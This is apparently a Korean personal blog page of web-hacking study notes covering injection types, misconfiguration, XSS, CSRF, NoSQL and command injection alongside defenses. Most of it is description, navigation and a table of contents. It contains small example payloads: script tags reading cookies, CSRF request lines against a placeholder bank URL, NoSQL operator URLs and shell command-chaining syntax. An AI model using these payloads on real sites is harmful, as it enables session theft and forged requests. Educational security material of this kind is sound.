<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploit | AswinBlue</title><meta name=keywords content><meta name=description content="공격 방법 분류
Server side 공격 방법

Injection (인젝션)

서버의 처리 과정 중 사용자가 입력한 데이터가 시스템의 다른 기능을 주거나 문법적으로 사용되어 발생하는 취약점
injection 공격의 종류

SQL Injection
Command Injection
SSTI (Server Side Template Injection)
Path Traversal
SSRF (Server Side Request Forgery)


ORM과 같이 검증된 SQL 라이브러리를 사용하여 방어가 필요하다.


File vulnerability

서버의 파일 시스템에 사용자가 원하는 행위를 할 수 있을 때 발생하는 취약점
system(PHP), child_process(Node JS), os.system(Python) 등 OS command를 실행하는 함수를 호출하지 않는 방법이 가장 좋으나, 입력 필터링이나 대체 라이브러리를 사용하는 방법으로 위협을 줄일 수 있다.


Business Logic Vulnerability (비즈니스 로직 취약점)

인젝션, 파일 관련 취약점들과는 다르게 정상적인 흐름을 악용하는 것


Language specific Vulnerability (PHP, Python, NodeJS)

웹 어플리케이션에서 사용하는 언어의 특성으로 인해 발생하는 취약점


Misconfiguration

잘못된 설정으로 인해 발생하는 취약점

Debug mode를 설정한 채로 배포하는 경우
임시/백업 파일을 삭제하지 않은 경우

백업파일 종류

bak : 백업 파일, 대부분의 에디터에서 사용함
config : 설정 파일, 비밀 키들이 존재하는 경우가 많음
sql : sql schema 파일, 데이터 베이스 구조를 알아낼 수 있음
sh : shell script 파일
~ : bluefish 에디터 백업 파일


서비스와는 무관한 파일들을 제거해서 위협을 없앨 수 있음




VCS 프로그램으로 인한 임시 파일들을 정리해야 한다.

.git, .hg 등의 파일이 있다.
https://github.com/kost/dvcs-ripper 정보를 참조하여 진단이 가능하다.
웹 서버의 설정으로 VCS 파일의 경로의 접근을 막는 방법도 가능하다.
location ~ /\.(git|hg) {
  deny all;
}



네트워크 바인딩을 0.0.0.0 으로 세팅하는 경우

편의를 위해 세팅한 설정을 운영 환경이 변경되었음에도 그대로 유지하여 발생할 수 있는 취약점이다.
내부 망에서만 접근할 수 있는 서비스는 mask를 제대로 설정 해 주고, 허용할 포트를 제외한 설정은 모두 삭제하도록 하여 위협을 제거한다.





취약점
XSS (Cross Site Scripting)

공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다.
XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다.

공격 경로

XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다.

악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다.
Flask는 render_template 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다.


아래와 같이 입력값을 그대로 출력하게 되면, 입력값으로 script 를 전달해 공격에 사용할 수 있다.

서버의 코드
@app.route(&#34;/vulnerable&#34;)
def vulnerable():
    param = request.args.get(&#34;param&#34;, &#34;&#34;) # 이용자가 입력한 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시

공격자 입력1. 다른 페이지로 redirection
<script>location.href = &#34;/another_page?param=PARAM1&#34;;</script>

공격자 입력2. cookie 정보 출력
<script>document.cookie</script>




XSS 공격 종류

XSS 는 악성 스크립트의 위치와 침투 경로에 따라 아래와 같이 구분된다.

Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS

게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음
불특정 다수에게 보여지기 때문에 파급력이 크다.


Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS

게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있음
검색 결과를 응답에 포함하는 일부 서비스에서 발생 가능
공격을 위해서는 다른 이용자를 악성 스크립트가 포함된 링크에 접속하도록 유도해야 함


DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS
Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS



CSRF (Cross Site Request Forgery)

어떤 사이트에서 이용자의 신원 정보가 포함된 쿠키를 사용한다면, 타인의 쿠키를 탈취하여 변조된 명령을 서버로 번달하는 공격 방식이다.

이용자의 신원 정보가 포함된 쿠키는 일종의 서명과 같은 역할을 하기 때문에, 쿠키가 특정 명령에 대한 이용자의 본인 인증 역할을 수행할 수도 있다.


2차 인증을 수행하지 않고 cookie로만 인증을 하는 사이트에 대해 공격이 가능하다.
XSS는 인증 정보인 세션 및 쿠키 탈취를 목적으로 서버에서 스크립트를 실행 하는 방식인 반면, CSRF는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격이다.

공격 경로

<img> 태그나 <form> 태그를 활용해서 사용자가 의도하지 않은 명령을 서버에 요청하는 script를 실행시킬 수 있다.
/* img 태그 활용 요청 전달 */
<img src='http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337' width=0px height=0px>`
/* javascript 공격 예시 */
/* 새 창 띄우기 */
window.open('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337');
/* 현재 창 주소 옮기기 */
location.href = 'http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337';
location.replace('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337');


SQL Injection

조작된 SQL 쿼리를 서버에 주입하여 인증을 우회하거나, 데이터베이스의 정보를 유출하는 공격행위
Blind SQL Injection : SQL Injection 의 한 종류로, DBMS가 답변 가능한 형태로 질문을 수행하여 스무고개 게임과 같이 정답을 유추해 나가는 공격 기법

NoSQL Injection

NoSQL은 데이터 타입으로 &lsquo;오브젝트&rsquo; 라는 개념을 갖는다. 오브젝트 타입의 입력값을 처리할 때에는 쿼리 연산자를 사용할 수 있고, 이 부분의 취약점을 활용한 것이 NoSQL Injection 이다.
NodeJs를 예를 들면 아래와 같이 url에 object를 대입할 수 있다.
// 서버 코드 예시
const express = require('express');
const app = express();
app.get('/', function(req,res) {
    console.log('data:', req.query.data, ' / type:', typeof req.query.data);
    res.send('done');
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
// 결과 예시
http://localhost:3000/?data=1234
data: 1234
type: string

http://localhost:3000/?data[]=1234
data: [ '1234' ]
type: object

http://localhost:3000/?data[]=1234&amp;data[]=5678
data: [ '1234', '5678' ] 
type: object

http://localhost:3000/?data[5678]=1234
data: { '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data=0000
data: { '5678': '1234', '0000': true } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data[]=0000
data: { '0': '0000', '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data[1111]=0000
data: { '1111': '0000', '5678': '1234' } 
type: object

이 방법으로 아래와 같이 &lsquo;data&rsquo; 객체 안에 NoSQL 쿼리가 들어가도록 url을 설정할 수도 있다.

NoSQL 문법 참조

http://localhost:3000/?data[$eq]=A
data: { &#34;$eq&#34;: &#34;A&#34; } 
type: object




Command Injection

공격자가 클라이언트 인터페이스를 통해 서버측에 시스템 명령어를 전달하여 실행시켜 공격을 수행하는 기법
PHP의 system, Node JS의 child_process, 파이썬의 os.system 과 같이 시스템 명령어를 수행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생할 수 있다.
명령어 입력란에 다른 명령어를 입력하는 기법에는 다음의 메타문자 들을 활용할 수 있다.

명령어 치환

리눅스 쉘에서 `` 사이에 든 문자는 새로운 명령어 라인으로 인식한다.

ex) echo `ls`

ls 명령어가 실행된다.




리눅스 쉘에서 $() 사이에 든 문자는 새로운 명령어 라인으로 인식한다.

ex) echo $(ls)

ls 명령어가 실행된다.






명령어 연속 실행


리눅스 쉘에서 || 를 사용하면, || 앞과 || 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.

한 줄에 둘 이상의 명령어를 실행시킬 수 있다.
ex) mkdir FILE || cd FILE

FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.




리눅스 쉘에서 && 를 사용하면, && 앞과 && 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.

ex) mkdir FILE && cd FILE

FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.




리눅스 쉘에서 ; 를 사용하면, ; 앞과 ; 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.

ex) mkdir FILE ; cd FILE

FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.






파이프

리눅스 쉘에서 | 를 사용하면 | 앞의 명령어 실행 결과를 | 뒤의 명령어 실행시 입력으로 설정할 수 있다.

ex) cat FILE | less

FILE 내용을 출력한 것을 less 명령으로 나눠서 볼 수 있도록 한다.






뒷내용 무시

리눅스 쉘에서 #을 사용하면 # 뒤의 내용은 주석처리되어 무시된다.

ex) ls #a&#34;sdfa&#34;sd&rsquo;fas&#34;&rsquo;&ldquo;df

구문 오류 없이 ls 명령이 잘 실행된다.








문자열을 whitelist 처리하거나 blacklist 처리하여 공격을 방어할 수 있다.

정규식을 통해 IP 주소 포멧을 whitelist 로 지정하는 코드
import re, os, ...
...
chk_ip = re.compile('^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
if bool(chk_ip.match(ip)):
    return run_system(f'ping -c 3 {ip}')
else:
    return 'ip format error'

허용되면 안되는 문자열을 blacklist 로 지정하는 코드

if '\'' in ip:
    return 'not allowed character'
return run_system(f'ping -c 3 \'{ip}\'')  # shell command 상에서 모든 입력을 문자열로 처리하는 Single Quotes (')를 사용해야 함

system(PHP), child_process(Node JS), os.system(Python) 등 OS command를 실행하는 함수 외 대체 라이브러리를 사용하는 방법으로 위협을 줄일 수 있다.

File Vulnerability

공격자의 파일을 웹 서비스의 파일 시스템에 업로드 혹은 하는 과정에서 발생하는 보안 취약점
파일 업로드/다운로드 서비스를 개발시 이용자가 업로드한 파일을 데이터베이스에 저장하는 것보다는 서버의 파일 시스템에 저장하는 것이 개발하기 쉽고, 관리 효율도 높지만 File Vulnerability를 주의해야 한다.
원격 코드 실행, 민감정보 탈취 등이 수행될 수 있다.



File Upload Vulnerability"><meta name=author content="AswinBlue"><link rel=canonical href=https://aswinblue.github.io/Blog/post/webhacking/exploit/><meta name=google-site-verification content="XYZabc"><link crossorigin=anonymous href=https://aswinblue.github.io/Blog/assets/css/stylesheet.min.ac5e39aebcdf573fbb0ab1501e9a28c0b9ed17e8d1576545c4256969e923d75c.css integrity="sha256-rF45rrzfVz+7CrFQHpoowLntF+jRV2VFxCVpaekj11w=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=https://aswinblue.github.io/Blog/assets/js/highlight.min.555af97124d54bb1457985dd081b8f5616a48103aafeb30ac89fde835d65aa6c.js integrity="sha256-VVr5cSTVS7FFeYXdCBuPVhakgQOq/rMKyJ/eg11lqmw=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://aswinblue.github.io/Blog/post/webhacking/exploit/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://aswinblue.github.io/Blog/ accesskey=h title="AswinBlue (Alt + H)">AswinBlue</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://aswinblue.github.io/Blog/archives title=Archive><span>Archive</span></a></li><li><a href=https://aswinblue.github.io/Blog/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://aswinblue.github.io/Blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://aswinblue.github.io/Blog/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><div class=grid-container><div style=float:left;margin:30px class=auto-hide-div><ul><li style=list-style-position:inside;text-indent:20px;color:#1284ff><a href=https://aswinblue.github.io/Blog/post/webhacking/>WebHacking</a><ul><li style=list-style-position:inside;text-indent:30px;color:#1284ff;content:\25ba\00a0><a href=https://aswinblue.github.io/Blog/post/webhacking/exploit/>Exploit</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webhacking/cookie/>Cookie</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webhacking/web/>Web</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webhacking/http/>HTTP</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/>System Hacking</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/reverse_engineering/>Reverse Engineering</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/exploit/>Exploit</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/pwntool/>Pwntool</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/assembly/>Assembly</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/assembly/assembly_basic/>Assembly_basic</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/>🔷Projects</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/youtube_downloader/>Youtube Downloader</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/delver/>Delver</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/flick_through/>FlickThrough</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/windowapp/>WindowApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/windowapp/window_programming/>Window_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/windowapp/kivy/>Kivy</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/>WebServer</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/spring_boot/>Spring_boot</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/spring/>Spring basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/nodejs/>Nodejs</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/>WebApplication</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/thymeleaf/>thymeleaf</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/tailwind/>Tailwind</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/angular/>Angular</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/react_basic/>React basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/pythoncgi/>PythonCGI</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/javascript/>JavaScript</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/css/>Css</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/html/>HTML</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/python/>Python</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/python/python_basic/>Python 기초</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/mobileapp/>MobileApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/mobileapp/flutter/>Flutter</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/machinelearning/>MachineLearning</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/machinelearning/tensorflow/>Tensorflow</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/java/>Java</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/java/jython/>Jython</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/>Linux</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/ipc/>IPC</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/thread/>Thread</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/process/>Process</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/system_programming/>System_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/shell_programming/>Shell Programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_introduction/>Linux_introduction</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_env/>Linux_env</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/virtual_box/>Virtual_box</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_command/>Linux commands</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_apt/>Linux_apt</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/hugo/>Hugo</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/hugo/hugo_dev/>Hugo 환경세팅</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/hugo/sample/>Markdown Syntax Guide</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/golang/>GoLang</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/golang/golang/>Golang</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/git/>Git</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/git/git/>Git</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/>DevelopTips</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/vscode/>VsCode</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/window/>Window</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/web_scrapping/>Web_scrapping</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/>DataBases</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/database/>Database</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/firebase_react/>Firebase_react</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/firebase/>Firebase</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/mysql/>Mysql</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/crypto/>Crypto</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/crypto/cryptocurrency/>Cryptocurrency</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/computerscience/>ComputerScience</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/computerscience/computer_science/>Computer Science</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/cloud/>Cloud</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/cloud/aws/>Aws</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/ci_cd/>CI_CD</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/ci_cd/docker/>Docker</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/algorithm/>Algorithm</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/algorithm/algorithm/>Algorithm</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/>C++</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/unit_test/>Unit Test</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/make/>Make</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/gcc/>Gcc</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/c++_stl/>C++_stl</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/gdb/>GDB</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/c++/>C++ basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/cmake/>CMake</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/json_c++/>Json in C++</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/log_c++/>spdlog C++</a></li></ul></li><ul></ul><ul></ul></ul></div><main class=main style=grid-row:1;grid-column:2;width:100%><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://aswinblue.github.io/Blog/>Home</a>&nbsp;»&nbsp;<a href=https://aswinblue.github.io/Blog/post/webhacking/>WebHacking</a></div><h1 class=post-title>Exploit</h1><div class=post-meta>&lt;span title='2025-03-11 20:54:59 +0900 KST'>March 11, 2025&lt;/span>&amp;nbsp;·&amp;nbsp;26 min&amp;nbsp;·&amp;nbsp;AswinBlue&nbsp;|&nbsp;<a href=https://github.com/AswinBlue/HugoBlog/tree/master/content/post/WebHacking/exploit.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%ea%b3%b5%ea%b2%a9-%eb%b0%a9%eb%b2%95-%eb%b6%84%eb%a5%98 aria-label="공격 방법 분류">공격 방법 분류</a><ul><li><a href=#server-side-%ea%b3%b5%ea%b2%a9-%eb%b0%a9%eb%b2%95 aria-label="Server side 공격 방법">Server side 공격 방법</a></li></ul></li><li><a href=#%ec%b7%a8%ec%95%bd%ec%a0%90 aria-label=취약점>취약점</a><ul><li><a href=#xss-cross-site-scripting aria-label="XSS (Cross Site Scripting)">XSS (Cross Site Scripting)</a><ul><li><a href=#%ea%b3%b5%ea%b2%a9-%ea%b2%bd%eb%a1%9c aria-label="공격 경로">공격 경로</a></li><li><a href=#xss-%ea%b3%b5%ea%b2%a9-%ec%a2%85%eb%a5%98 aria-label="XSS 공격 종류">XSS 공격 종류</a></li></ul></li><li><a href=#csrf-cross-site-request-forgery aria-label="CSRF (Cross Site Request Forgery)">CSRF (Cross Site Request Forgery)</a><ul><li><a href=#%ea%b3%b5%ea%b2%a9-%ea%b2%bd%eb%a1%9c-1 aria-label="공격 경로">공격 경로</a></li></ul></li><li><a href=#sql-injection aria-label="SQL Injection">SQL Injection</a></li><li><a href=#nosql-injection aria-label="NoSQL Injection">NoSQL Injection</a></li><li><a href=#command-injection aria-label="Command Injection">Command Injection</a></li><li><a href=#file-vulnerability aria-label="File Vulnerability">File Vulnerability</a></li><li><a href=#ssrf-server-side-request-forgery aria-label="SSRF (Server-side Request Forgery)">SSRF (Server-side Request Forgery)</a></li><li><a href=#path-traversal aria-label="path traversal">path traversal</a></li><li><a href=#ssti-server-side-template-injection aria-label="SSTI (Server Side Template Injection)">SSTI (Server Side Template Injection)</a></li><li><a href=#business-logic-vulnerability aria-label="Business Logic Vulnerability">Business Logic Vulnerability</a></li><li><a href=#language-specific-vulnerability aria-label="Language specific Vulnerability">Language specific Vulnerability</a></li><li><a href=#bypass-waf aria-label="bypass WAF">bypass WAF</a></li><li><a href=#security-misconfiguration aria-label="Security Misconfiguration">Security Misconfiguration</a></li><li><a href=#serialize--deserialize aria-label="Serialize / Deserialize">Serialize / Deserialize</a></li></ul></li><li><a href=#%ea%b3%b5%ea%b2%a9-%ea%b8%b0%eb%b2%95 aria-label="공격 기법">공격 기법</a><ul><li><a href=#innerhtml-%ec%9d%84-%ed%86%b5%ed%95%9c-xss-%ec%b7%a8%ec%95%bd%ec%a0%90-%ea%b3%b5%ea%b2%a9 aria-label="innerHTML 을 통한 XSS 취약점 공격">innerHTML 을 통한 XSS 취약점 공격</a></li><li><a href=#innerhtml-%ec%9d%84-%ed%86%b5%ed%95%9c-xss-%ec%b7%a8%ec%95%bd%ec%a0%90-%ea%b3%b5%ea%b2%a92 aria-label="innerHTML 을 통한 XSS 취약점 공격2">innerHTML 을 통한 XSS 취약점 공격2</a></li><li><a href=#sql-injection-1 aria-label="SQL Injection">SQL Injection</a></li><li><a href=#blind-sql-injection aria-label="Blind SQL Injection">Blind SQL Injection</a></li><li><a href=#blind-nosql-injection aria-label="Blind NoSQL Injection">Blind NoSQL Injection</a></li><li><a href=#file-vulnerability-1 aria-label="File Vulnerability">File 